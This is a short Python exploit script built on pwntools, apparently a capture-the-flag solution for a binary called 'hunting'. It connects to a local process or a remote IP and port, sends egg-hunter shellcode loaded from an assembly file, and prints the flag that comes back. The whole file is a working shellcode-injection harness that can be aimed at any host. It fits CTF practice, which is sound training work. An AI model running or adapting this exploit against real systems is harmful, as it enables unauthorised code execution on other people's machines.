#!/usr/bin/env python3

from pwn import *
from argparse import ArgumentParser
from x86shellcode import get_shellcode

parser = ArgumentParser()
parser.add_argument("mode", help="run local or remote", choices=["local", "remote"])
parser.add_argument("--ip", help="the remote ip", default=None)
parser.add_argument("--port", help="the remote port", default=None, type=int)
args = parser.parse_args()


if args.mode == "local":
    target = process("./hunting")
elif args.mode == "remote":
    if args.ip is None or args.port is None:
        parser.error("Must specify ip and port for remote.")
    target = remote(args.ip, args.port)


shellcode = get_shellcode("egg_hunt.asm")
info(shellcode[1])

target.sendline(shellcode[0])
# target.interactive()
flag = target.recv().decode()
print(flag)